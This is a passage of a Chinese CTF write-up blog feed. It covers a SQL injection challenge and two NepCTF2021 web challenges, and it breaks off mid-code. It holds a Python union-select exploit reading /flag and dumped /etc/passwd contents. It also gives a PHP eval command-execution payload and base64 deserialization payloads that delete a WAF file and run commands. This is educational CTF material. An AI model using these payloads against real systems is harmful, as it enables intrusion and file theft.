keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>以下是本人的碎碎念和反思，师傅们可以跳过惹</p><p>经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(</p><p>数据库里写的<code>flag.txt</code>，最后却在根目录<code>/flag</code>。尝试过十六进制<code>/flag</code>读取，可能是因为太卡了，没成功就没再试了，以为就是<code>flag.txt</code>。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333</p><p>还尝试了读取一堆无用的东西，以为和 <a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a> 一样</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>没有线索，盲猜读了个<code>start.sh</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/run/mysqld/mysqld.sock.lock<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/mysql.sock<span class="token function">usermod</span> <span class="token parameter variable">-d</span> /var/lib/mysql/ mysql<span class="token function">ln</span> <span class="token parameter variable">-s</span> /var/lib/mysql/mysql.sock /tmp/mysql.sock<span class="token function">chown</span> <span class="token parameter variable">-R</span> mysql:mysql /var/lib/mysqlmysqld_safe <span class="token operator">&amp;</span><span class="token function-name function">mysql_ready</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mysqladmin <span class="token function">ping</span> <span class="token parameter variable">--socket</span><span class="token operator">=</span>/run/mysqld/mysqld.sock <span class="token parameter variable">--user</span><span class="token operator">=</span>root <span class="token parameter variable">--password</span><span class="token operator">=</span>root <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token operator">!</span><span class="token punctuation">(</span>mysql_ready<span class="token punctuation">)</span><span class="token keyword">do</span><span class="token builtin class-name">echo</span> <span class="token string">"waiting for mysql ..."</span><span class="token function">sleep</span> <span class="token number">3</span><span class="token keyword">done</span>mysql <span class="token parameter variable">-e</span> <span class="token string">"ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';flush privileges;"</span> <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /db.sql <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    mysql <span class="token parameter variable">-e</span> <span class="token string">"source /db.sql"</span> <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-proot</span>    <span class="token function">rm</span> <span class="token parameter variable">-f</span> /db.sql<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /flag.sh <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token builtin class-name">source</span> /flag.sh<span class="token keyword">fi</span>apache2-foreground</code></pre><p>然后开始爆<code>/proc/[id]/fd/[id]</code>一去不复返了。平台弄卡也有我的一份～</p><p>甚至还读了apache配置文件等等等，实在是经验不足，还是本人太菜了2333</p><p>做个反思吧，也许哪天羞耻心爆发这段就给我删了。</p><p>写给他人明鉴，写给自己反思。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2021</title>
      <link href="article/Nepctf2021/"/>
      <url>article/Nepctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：Err0r</p><span id="more"></span><p>队伍情况：</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>虽然平台八太行，但是部分题目质量很高，本菜鸡爬了，虚心学习。</p><p>本Wp侧重于思路记录，大佬们轻喷…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span><span class="token string backtick-quoted-string">`cat`</span><span class="token punctuation">;</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span><span class="token string backtick-quoted-string">`*>a`</span><span class="token punctuation">;</span>访问<span class="token operator">.</span><span class="token operator">/</span>a</code></pre><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>非常简洁，传入两个参数然后<code>eval</code>执行，格式为</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>利用&#96;反引号和分号;执行命令</p><p>首先看到<code>len</code>用来截断字符串<code>nep</code>，而if中<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>即长度不相等，刚开始以为需要利用整形溢出</p><blockquote><p>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p></blockquote><p>测试了一下发现不对，传入字符串视为<strong>字符串类型</strong>，并不存在整形溢出，如下</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>所以思路不对，接下来想到四字符RCE，<a href="https://blog.csdn.net/q20010619/article/details/109206728">参考文章</a>，测试了一下，问题是测试下来目录非常的杂乱</p><p>flag就在当前目录，无法准确直接cat。<strong>此脚本无效，以前的脚本直接用，仅展示</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        待续</code></pre><p>访问下v，结果仅能扫到目录</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>目录变得非常乱，于是想为何不能利用<code>*</code>直接读文件呢</p><blockquote><p>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></blockquote><p>测试如下</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>测试可行，输出一个<code>cat</code>文件，然后目录就有<code>cat</code>&#x2F;<code>index.php</code>&#x2F;<code>nepctf.php</code>了，然后执行<code>*&gt;a</code>，即将目录内容当作命令执行输出到文件a，cat全部文件，然后访问文件a即可</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h4><pre class="language-none"><code class="language-none">读取shell.php：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---删除waf.txt：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---读取flag：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9是不是很简单？</code></pre><p>很文艺的名字，我信了它《简单的PHP反序列化》</p><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>分析下，首先要绕<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>，直接数组绕过，传入<code>./?a[]=1&amp;b[]=a</code>即可，如下</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="读取shell-php："><a href="#读取shell-php：" class="headerlink" title="读取shell.php："></a>读取shell.php：</h5><p>看Game类</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token 